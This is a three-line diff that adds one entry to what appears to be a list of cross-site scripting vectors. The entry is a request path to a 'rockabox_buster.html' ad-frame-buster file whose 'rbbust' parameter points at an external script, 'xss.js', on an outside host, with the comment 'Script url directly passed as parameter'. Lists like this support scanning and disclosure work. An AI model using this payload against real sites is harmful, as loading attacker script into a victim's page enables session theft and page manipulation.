@@ -1,0 +1,3 @@
+/rockabox_buster.html?rbbust=https://bgtian.life/xss.js
+
+Script url directly passed as parameter
